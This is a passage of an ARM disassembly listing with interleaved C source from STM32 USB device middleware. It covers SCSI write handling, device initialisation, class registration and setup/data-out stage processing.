 800afa4:	66d3      	str	r3, [r2, #108]	; 0x6c
  hmsc->scsi_blk_len -= (len / hmsc->scsi_blk_size);
 800afa6:	68fb      	ldr	r3, [r7, #12]
 800afa8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afac:	6f1a      	ldr	r2, [r3, #112]	; 0x70
 800afae:	68fb      	ldr	r3, [r7, #12]
 800afb0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afb4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800afb8:	4619      	mov	r1, r3
 800afba:	68bb      	ldr	r3, [r7, #8]
 800afbc:	fbb3 f3f1 	udiv	r3, r3, r1
 800afc0:	1ad3      	subs	r3, r2, r3
 800afc2:	68fa      	ldr	r2, [r7, #12]
 800afc4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800afc8:	6713      	str	r3, [r2, #112]	; 0x70

  /* case 12 : Ho = Do */
  hmsc->csw.dDataResidue -= len;
 800afca:	68fb      	ldr	r3, [r7, #12]
 800afcc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afd0:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 800afd2:	68bb      	ldr	r3, [r7, #8]
 800afd4:	1ad3      	subs	r3, r2, r3
 800afd6:	68fa      	ldr	r2, [r7, #12]
 800afd8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800afdc:	6393      	str	r3, [r2, #56]	; 0x38

  if (hmsc->scsi_blk_len == 0U)
 800afde:	68fb      	ldr	r3, [r7, #12]
 800afe0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800afe4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800afe6:	2b00      	cmp	r3, #0
 800afe8:	d104      	bne.n	800aff4 <SCSI_ProcessWrite+0x110>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800afea:	2100      	movs	r1, #0
 800afec:	6878      	ldr	r0, [r7, #4]
 800afee:	f7fe fc53 	bl	8009898 <MSC_BOT_SendCSW>
 800aff2:	e019      	b.n	800b028 <SCSI_ProcessWrite+0x144>
  }
  else
  {
    len = MIN((hmsc->scsi_blk_len * hmsc->scsi_blk_size), MSC_MEDIA_PACKET);
 800aff4:	68fb      	ldr	r3, [r7, #12]
 800aff6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800affa:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800affc:	68fa      	ldr	r2, [r7, #12]
 800affe:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800b002:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800b006:	fb02 f303 	mul.w	r3, r2, r3
 800b00a:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800b00e:	bf28      	it	cs
 800b010:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800b014:	60bb      	str	r3, [r7, #8]

    /* Prepare EP to Receive next packet */
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800b016:	4b07      	ldr	r3, [pc, #28]	; (800b034 <SCSI_ProcessWrite+0x150>)
 800b018:	7819      	ldrb	r1, [r3, #0]
 800b01a:	68fb      	ldr	r3, [r7, #12]
 800b01c:	f103 0210 	add.w	r2, r3, #16
 800b020:	68bb      	ldr	r3, [r7, #8]
 800b022:	6878      	ldr	r0, [r7, #4]
 800b024:	f002 f84c 	bl	800d0c0 <USBD_LL_PrepareReceive>
  }

  return 0;
 800b028:	2300      	movs	r3, #0
}
 800b02a:	4618      	mov	r0, r3
 800b02c:	3714      	adds	r7, #20
 800b02e:	46bd      	mov	sp, r7
 800b030:	bd90      	pop	{r4, r7, pc}
 800b032:	bf00      	nop
 800b034:	2000010b 	.word	0x2000010b

0800b038 <SCSI_UpdateBotData>:
  * @param  length: Data length
  * @retval status
  */
static int8_t SCSI_UpdateBotData(USBD_MSC_BOT_HandleTypeDef *hmsc,
                                 uint8_t *pBuff, uint16_t length)
{
 800b038:	b480      	push	{r7}
 800b03a:	b087      	sub	sp, #28
 800b03c:	af00      	add	r7, sp, #0
 800b03e:	60f8      	str	r0, [r7, #12]
 800b040:	60b9      	str	r1, [r7, #8]
 800b042:	4613      	mov	r3, r2
 800b044:	80fb      	strh	r3, [r7, #6]
  uint16_t len = length;
 800b046:	88fb      	ldrh	r3, [r7, #6]
 800b048:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800b04a:	68fb      	ldr	r3, [r7, #12]
 800b04c:	2b00      	cmp	r3, #0
 800b04e:	d102      	bne.n	800b056 <SCSI_UpdateBotData+0x1e>
  {
    return -1;
 800b050:	f04f 33ff 	mov.w	r3, #4294967295
 800b054:	e013      	b.n	800b07e <SCSI_UpdateBotData+0x46>
  }

  hmsc->bot_data_length = len;
 800b056:	8afa      	ldrh	r2, [r7, #22]
 800b058:	68fb      	ldr	r3, [r7, #12]
 800b05a:	60da      	str	r2, [r3, #12]

  while (len != 0U)
 800b05c:	e00b      	b.n	800b076 <SCSI_UpdateBotData+0x3e>
  {
    len--;
 800b05e:	8afb      	ldrh	r3, [r7, #22]
 800b060:	3b01      	subs	r3, #1
 800b062:	82fb      	strh	r3, [r7, #22]
    hmsc->bot_data[len] = pBuff[len];
 800b064:	8afb      	ldrh	r3, [r7, #22]
 800b066:	68ba      	ldr	r2, [r7, #8]
 800b068:	441a      	add	r2, r3
 800b06a:	8afb      	ldrh	r3, [r7, #22]
 800b06c:	7811      	ldrb	r1, [r2, #0]
 800b06e:	68fa      	ldr	r2, [r7, #12]
 800b070:	4413      	add	r3, r2
 800b072:	460a      	mov	r2, r1
 800b074:	741a      	strb	r2, [r3, #16]
  while (len != 0U)
 800b076:	8afb      	ldrh	r3, [r7, #22]
 800b078:	2b00      	cmp	r3, #0
 800b07a:	d1f0      	bne.n	800b05e <SCSI_UpdateBotData+0x26>
  }

  return 0;
 800b07c:	2300      	movs	r3, #0
}
 800b07e:	4618      	mov	r0, r3
 800b080:	371c      	adds	r7, #28
 800b082:	46bd      	mov	sp, r7
 800b084:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b088:	4770      	bx	lr

0800b08a <USBD_Init>:
  * @param  id: Low level core index
  * @retval None
  */
USBD_StatusTypeDef USBD_Init(USBD_HandleTypeDef *pdev,
                             USBD_DescriptorsTypeDef *pdesc, uint8_t id)
{
 800b08a:	b580      	push	{r7, lr}
 800b08c:	b086      	sub	sp, #24
 800b08e:	af00      	add	r7, sp, #0
 800b090:	60f8      	str	r0, [r7, #12]
 800b092:	60b9      	str	r1, [r7, #8]
 800b094:	4613      	mov	r3, r2
 800b096:	71fb      	strb	r3, [r7, #7]
  USBD_StatusTypeDef ret;

  /* Check whether the USB Host handle is valid */
  if (pdev == NULL)
 800b098:	68fb      	ldr	r3, [r7, #12]
 800b09a:	2b00      	cmp	r3, #0
 800b09c:	d101      	bne.n	800b0a2 <USBD_Init+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Device handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b09e:	2303      	movs	r3, #3
 800b0a0:	e01f      	b.n	800b0e2 <USBD_Init+0x58>
    pdev->NumClasses = 0;
    pdev->classId = 0;
  }
#else
  /* Unlink previous class*/
  pdev->pClass[0] = NULL;
 800b0a2:	68fb      	ldr	r3, [r7, #12]
 800b0a4:	2200      	movs	r2, #0
 800b0a6:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  pdev->pUserData[0] = NULL;
 800b0aa:	68fb      	ldr	r3, [r7, #12]
 800b0ac:	2200      	movs	r2, #0
 800b0ae:	f8c3 22c4 	str.w	r2, [r3, #708]	; 0x2c4
#endif /* USE_USBD_COMPOSITE */

  pdev->pConfDesc = NULL;
 800b0b2:	68fb      	ldr	r3, [r7, #12]
 800b0b4:	2200      	movs	r2, #0
 800b0b6:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0

  /* Assign USBD Descriptors */
  if (pdesc != NULL)
 800b0ba:	68bb      	ldr	r3, [r7, #8]
 800b0bc:	2b00      	cmp	r3, #0
 800b0be:	d003      	beq.n	800b0c8 <USBD_Init+0x3e>
  {
    pdev->pDesc = pdesc;
 800b0c0:	68fb      	ldr	r3, [r7, #12]
 800b0c2:	68ba      	ldr	r2, [r7, #8]
 800b0c4:	f8c3 22b4 	str.w	r2, [r3, #692]	; 0x2b4
  }

  /* Set Device initial State */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b0c8:	68fb      	ldr	r3, [r7, #12]
 800b0ca:	2201      	movs	r2, #1
 800b0cc:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->id = id;
 800b0d0:	68fb      	ldr	r3, [r7, #12]
 800b0d2:	79fa      	ldrb	r2, [r7, #7]
 800b0d4:	701a      	strb	r2, [r3, #0]

  /* Initialize low level driver */
  ret = USBD_LL_Init(pdev);
 800b0d6:	68f8      	ldr	r0, [r7, #12]
 800b0d8:	f001 fdb6 	bl	800cc48 <USBD_LL_Init>
 800b0dc:	4603      	mov	r3, r0
 800b0de:	75fb      	strb	r3, [r7, #23]

  return ret;
 800b0e0:	7dfb      	ldrb	r3, [r7, #23]
}
 800b0e2:	4618      	mov	r0, r3
 800b0e4:	3718      	adds	r7, #24
 800b0e6:	46bd      	mov	sp, r7
 800b0e8:	bd80      	pop	{r7, pc}

0800b0ea <USBD_RegisterClass>:
  * @param  pDevice : Device Handle
  * @param  pclass: Class handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_RegisterClass(USBD_HandleTypeDef *pdev, USBD_ClassTypeDef *pclass)
{
 800b0ea:	b580      	push	{r7, lr}
 800b0ec:	b084      	sub	sp, #16
 800b0ee:	af00      	add	r7, sp, #0
 800b0f0:	6078      	str	r0, [r7, #4]
 800b0f2:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800b0f4:	2300      	movs	r3, #0
 800b0f6:	81fb      	strh	r3, [r7, #14]

  if (pclass == NULL)
 800b0f8:	683b      	ldr	r3, [r7, #0]
 800b0fa:	2b00      	cmp	r3, #0
 800b0fc:	d101      	bne.n	800b102 <USBD_RegisterClass+0x18>
  {
#if (USBD_DEBUG_LEVEL > 1U)
    USBD_ErrLog("Invalid Class handle");
#endif /* (USBD_DEBUG_LEVEL > 1U) */
    return USBD_FAIL;
 800b0fe:	2303      	movs	r3, #3
 800b100:	e025      	b.n	800b14e <USBD_RegisterClass+0x64>
  }

  /* link the class to the USB Device handle */
  pdev->pClass[0] = pclass;
 800b102:	687b      	ldr	r3, [r7, #4]
 800b104:	683a      	ldr	r2, [r7, #0]
 800b106:	f8c3 22b8 	str.w	r2, [r3, #696]	; 0x2b8
  if (pdev->pClass[pdev->classId]->GetHSConfigDescriptor != NULL)
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetHSConfigDescriptor(&len);
  }
#else /* Default USE_USB_FS */
  if (pdev->pClass[pdev->classId]->GetFSConfigDescriptor != NULL)
 800b10a:	687b      	ldr	r3, [r7, #4]
 800b10c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b110:	687b      	ldr	r3, [r7, #4]
 800b112:	32ae      	adds	r2, #174	; 0xae
 800b114:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b118:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b11a:	2b00      	cmp	r3, #0
 800b11c:	d00f      	beq.n	800b13e <USBD_RegisterClass+0x54>
  {
    pdev->pConfDesc = (void *)pdev->pClass[pdev->classId]->GetFSConfigDescriptor(&len);
 800b11e:	687b      	ldr	r3, [r7, #4]
 800b120:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b124:	687b      	ldr	r3, [r7, #4]
 800b126:	32ae      	adds	r2, #174	; 0xae
 800b128:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b12c:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800b12e:	f107 020e 	add.w	r2, r7, #14
 800b132:	4610      	mov	r0, r2
 800b134:	4798      	blx	r3
 800b136:	4602      	mov	r2, r0
 800b138:	687b      	ldr	r3, [r7, #4]
 800b13a:	f8c3 22d0 	str.w	r2, [r3, #720]	; 0x2d0
  }
#endif /* USE_USB_FS */

  /* Increment the NumClasses */
  pdev->NumClasses ++;
 800b13e:	687b      	ldr	r3, [r7, #4]
 800b140:	f8d3 32d8 	ldr.w	r3, [r3, #728]	; 0x2d8
 800b144:	1c5a      	adds	r2, r3, #1
 800b146:	687b      	ldr	r3, [r7, #4]
 800b148:	f8c3 22d8 	str.w	r2, [r3, #728]	; 0x2d8

  return USBD_OK;
 800b14c:	2300      	movs	r3, #0
}
 800b14e:	4618      	mov	r0, r3
 800b150:	3710      	adds	r7, #16
 800b152:	46bd      	mov	sp, r7
 800b154:	bd80      	pop	{r7, pc}

0800b156 <USBD_Start>:
  *         Start the USB Device Core.
  * @param  pdev: Device Handle
  * @retval USBD Status
  */
USBD_StatusTypeDef USBD_Start(USBD_HandleTypeDef *pdev)
{
 800b156:	b580      	push	{r7, lr}
 800b158:	b082      	sub	sp, #8
 800b15a:	af00      	add	r7, sp, #0
 800b15c:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800b15e:	6878      	ldr	r0, [r7, #4]
 800b160:	f001 fdca 	bl	800ccf8 <USBD_LL_Start>
 800b164:	4603      	mov	r3, r0
}
 800b166:	4618      	mov	r0, r3
 800b168:	3708      	adds	r7, #8
 800b16a:	46bd      	mov	sp, r7
 800b16c:	bd80      	pop	{r7, pc}

0800b16e <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800b16e:	b480      	push	{r7}
 800b170:	b083      	sub	sp, #12
 800b172:	af00      	add	r7, sp, #0
 800b174:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800b176:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800b178:	4618      	mov	r0, r3
 800b17a:	370c      	adds	r7, #12
 800b17c:	46bd      	mov	sp, r7
 800b17e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b182:	4770      	bx	lr

0800b184 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b184:	b580      	push	{r7, lr}
 800b186:	b084      	sub	sp, #16
 800b188:	af00      	add	r7, sp, #0
 800b18a:	6078      	str	r0, [r7, #4]
 800b18c:	460b      	mov	r3, r1
 800b18e:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b190:	2300      	movs	r3, #0
 800b192:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800b194:	687b      	ldr	r3, [r7, #4]
 800b196:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b19a:	2b00      	cmp	r3, #0
 800b19c:	d009      	beq.n	800b1b2 <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800b19e:	687b      	ldr	r3, [r7, #4]
 800b1a0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1a4:	681b      	ldr	r3, [r3, #0]
 800b1a6:	78fa      	ldrb	r2, [r7, #3]
 800b1a8:	4611      	mov	r1, r2
 800b1aa:	6878      	ldr	r0, [r7, #4]
 800b1ac:	4798      	blx	r3
 800b1ae:	4603      	mov	r3, r0
 800b1b0:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b1b2:	7bfb      	ldrb	r3, [r7, #15]
}
 800b1b4:	4618      	mov	r0, r3
 800b1b6:	3710      	adds	r7, #16
 800b1b8:	46bd      	mov	sp, r7
 800b1ba:	bd80      	pop	{r7, pc}

0800b1bc <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800b1bc:	b580      	push	{r7, lr}
 800b1be:	b084      	sub	sp, #16
 800b1c0:	af00      	add	r7, sp, #0
 800b1c2:	6078      	str	r0, [r7, #4]
 800b1c4:	460b      	mov	r3, r1
 800b1c6:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800b1c8:	2300      	movs	r3, #0
 800b1ca:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800b1cc:	687b      	ldr	r3, [r7, #4]
 800b1ce:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1d2:	685b      	ldr	r3, [r3, #4]
 800b1d4:	78fa      	ldrb	r2, [r7, #3]
 800b1d6:	4611      	mov	r1, r2
 800b1d8:	6878      	ldr	r0, [r7, #4]
 800b1da:	4798      	blx	r3
 800b1dc:	4603      	mov	r3, r0
 800b1de:	2b00      	cmp	r3, #0
 800b1e0:	d001      	beq.n	800b1e6 <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800b1e2:	2303      	movs	r3, #3
 800b1e4:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800b1e6:	7bfb      	ldrb	r3, [r7, #15]
}
 800b1e8:	4618      	mov	r0, r3
 800b1ea:	3710      	adds	r7, #16
 800b1ec:	46bd      	mov	sp, r7
 800b1ee:	bd80      	pop	{r7, pc}

0800b1f0 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800b1f0:	b580      	push	{r7, lr}
 800b1f2:	b084      	sub	sp, #16
 800b1f4:	af00      	add	r7, sp, #0
 800b1f6:	6078      	str	r0, [r7, #4]
 800b1f8:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800b1fa:	687b      	ldr	r3, [r7, #4]
 800b1fc:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b200:	6839      	ldr	r1, [r7, #0]
 800b202:	4618      	mov	r0, r3
 800b204:	f001 f8a7 	bl	800c356 <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800b208:	687b      	ldr	r3, [r7, #4]
 800b20a:	2201      	movs	r2, #1
 800b20c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800b210:	687b      	ldr	r3, [r7, #4]
 800b212:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800b216:	461a      	mov	r2, r3
 800b218:	687b      	ldr	r3, [r7, #4]
 800b21a:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800b21e:	687b      	ldr	r3, [r7, #4]
 800b220:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b224:	f003 031f 	and.w	r3, r3, #31
 800b228:	2b02      	cmp	r3, #2
 800b22a:	d01a      	beq.n	800b262 <USBD_LL_SetupStage+0x72>
 800b22c:	2b02      	cmp	r3, #2
 800b22e:	d822      	bhi.n	800b276 <USBD_LL_SetupStage+0x86>
 800b230:	2b00      	cmp	r3, #0
 800b232:	d002      	beq.n	800b23a <USBD_LL_SetupStage+0x4a>
 800b234:	2b01      	cmp	r3, #1
 800b236:	d00a      	beq.n	800b24e <USBD_LL_SetupStage+0x5e>
 800b238:	e01d      	b.n	800b276 <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800b23a:	687b      	ldr	r3, [r7, #4]
 800b23c:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b240:	4619      	mov	r1, r3
 800b242:	6878      	ldr	r0, [r7, #4]
 800b244:	f000 fad4 	bl	800b7f0 <USBD_StdDevReq>
 800b248:	4603      	mov	r3, r0
 800b24a:	73fb      	strb	r3, [r7, #15]
      break;
 800b24c:	e020      	b.n	800b290 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b24e:	687b      	ldr	r3, [r7, #4]
 800b250:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b254:	4619      	mov	r1, r3
 800b256:	6878      	ldr	r0, [r7, #4]
 800b258:	f000 fb3c 	bl	800b8d4 <USBD_StdItfReq>
 800b25c:	4603      	mov	r3, r0
 800b25e:	73fb      	strb	r3, [r7, #15]
      break;
 800b260:	e016      	b.n	800b290 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b262:	687b      	ldr	r3, [r7, #4]
 800b264:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b268:	4619      	mov	r1, r3
 800b26a:	6878      	ldr	r0, [r7, #4]
 800b26c:	f000 fb9e 	bl	800b9ac <USBD_StdEPReq>
 800b270:	4603      	mov	r3, r0
 800b272:	73fb      	strb	r3, [r7, #15]
      break;
 800b274:	e00c      	b.n	800b290 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b276:	687b      	ldr	r3, [r7, #4]
 800b278:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b27c:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b280:	b2db      	uxtb	r3, r3
 800b282:	4619      	mov	r1, r3
 800b284:	6878      	ldr	r0, [r7, #4]
 800b286:	f001 fe13 	bl	800ceb0 <USBD_LL_StallEP>
 800b28a:	4603      	mov	r3, r0
 800b28c:	73fb      	strb	r3, [r7, #15]
      break;
 800b28e:	bf00      	nop
  }

  return ret;
 800b290:	7bfb      	ldrb	r3, [r7, #15]
}
 800b292:	4618      	mov	r0, r3
 800b294:	3710      	adds	r7, #16
 800b296:	46bd      	mov	sp, r7
 800b298:	bd80      	pop	{r7, pc}

0800b29a <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b29a:	b580      	push	{r7, lr}
 800b29c:	b086      	sub	sp, #24
 800b29e:	af00      	add	r7, sp, #0
 800b2a0:	60f8      	str	r0, [r7, #12]
 800b2a2:	460b      	mov	r3, r1
 800b2a4:	607a      	str	r2, [r7, #4]
 800b2a6:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b2a8:	2300      	movs	r3, #0
 800b2aa:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b2ac:	7afb      	ldrb	r3, [r7, #11]
 800b2ae:	2b00      	cmp	r3, #0
 800b2b0:	d16e      	bne.n	800b390 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b2b2:	68fb      	ldr	r3, [r7, #12]
 800b2b4:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b2b8:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b2ba:	68fb      	ldr	r3, [r7, #12]
 800b2bc:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b2c0:	2b03      	cmp	r3, #3
 800b2c2:	f040 8098 	bne.w	800b3f6 <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b2c6:	693b      	ldr	r3, [r7, #16]
 800b2c8:	689a      	ldr	r2, [r3, #8]
 800b2ca:	693b      	ldr	r3, [r7, #16]
 800b2cc:	68db      	ldr	r3, [r3, #12]
 800b2ce:	429a      	cmp	r2, r3
 800b2d0:	d913      	bls.n	800b2fa <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b2d2:	693b      	ldr	r3, [r7, #16]
 800b2d4:	689a      	ldr	r2, [r3, #8]
 800b2d6:	693b      	ldr	r3, [r7, #16]
 800b2d8:	68db      	ldr	r3, [r3, #12]
 800b2da:	1ad2      	subs	r2, r2, r3
 800b2dc:	693b      	ldr	r3, [r7, #16]
 800b2de:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b2e0:	693b      	ldr	r3, [r7, #16]
 800b2e2:	68da      	ldr	r2, [r3, #12]
 800b2e4:	693b      	ldr	r3, [r7, #16]
 800b2e6:	689b      	ldr	r3, [r3, #8]
 800b2e8:	4293      	cmp	r3, r2
 800b2ea:	bf28      	it	cs
 800b2ec:	4613      	movcs	r3, r2
 800b2ee:	461a      	mov	r2, r3
 800b2f0:	6879      	ldr	r1, [r7, #4]
 800b2f2:	68f8      	ldr	r0, [r7, #12]
 800b2f4:	f001 f923 	bl	800c53e <USBD_CtlContinueRx>
 800b2f8:	e07d      	b.n	800b3f6 <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b2fa:	68fb      	ldr	r3, [r7, #12]
 800b2fc:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b300:	f003 031f 	and.w	r3, r3, #31
 800b304:	2b02      	cmp	r3, #2
 800b306:	d014      	beq.n	800b332 <USBD_LL_DataOutStage+0x98>
 800b308:	2b02      	cmp	r3, #2
 800b30a:	d81d      	bhi.n	800b348 <USBD_LL_DataOutStage+0xae>
 800b30c:	2b00      	cmp	r3, #0
 800b30e:	d002      	beq.n	800b316 <USBD_LL_DataOutStage+0x7c>
 800b310:	2b01      	cmp	r3, #1
 800b312:	d003      	beq.n	800b31c <USBD_LL_DataOutStage+0x82>
 800b314:	e018      	b.n	800b348 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b316:	2300      	movs	r3, #0
 800b318:	75bb      	strb	r3, [r7, #22]
            break;
 800b31a:	e018      	b.n	800b34e <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b31c:	68fb      	ldr	r3, [r7, #12]
 800b31e:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b322:	b2db      	uxtb	r3, r3
 800b324:	4619      	mov	r1, r3
 800b326:	68f8      	ldr	r0, [r7, #12]
 800b328:	f000 f9d2 	bl	800b6d0 <USBD_CoreFindIF>
 800b32c:	4603      	mov	r3, r0
 800b32e:	75bb      	strb	r3, [r7, #22]
            break;
 800b330:	e00d      	b.n	800b34e <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b332:	68fb      	ldr	r3, [r7, #12]
 800b334:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b338:	b2db      	uxtb	r3, r3
 800b33a:	4619      	mov	r1, r3
 800b33c:	68f8      	ldr	r0, [r7, #12]
 800b33e:	f000 f9d4 	bl	800b6ea <USBD_CoreFindEP>
 800b342:	4603      	mov	r3, r0
 800b344:	75bb      	strb	r3, [r7, #22]
            break;
 800b346:	e002      	b.n	800b34e <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b348:	2300      	movs	r3, #0
 800b34a:	75bb      	strb	r3, [r7, #22]
            break;
 800b34c:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b34e:	7dbb      	ldrb	r3, [r7, #22]
 800b350:	2b00      	cmp	r3, #0
 800b352:	d119      	bne.n	800b388 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b354:	68fb      	ldr	r3, [r7, #12]
 800b356:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b35a:	b2db      	uxtb	r3, r3
 800b35c:	2b03      	cmp	r3, #3
 800b35e:	d113      	bne.n	800b388 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b360:	7dba      	ldrb	r2, [r7, #22]
 800b362:	68fb      	ldr	r3, [r7, #12]
 800b364:	32ae      	adds	r2, #174	; 0xae
 800b366:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b36a:	691b      	ldr	r3, [r3, #16]
 800b36c:	2b00      	cmp	r3, #0
 800b36e:	d00b      	beq.n	800b388 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b370:	7dba      	ldrb	r2, [r7, #22]
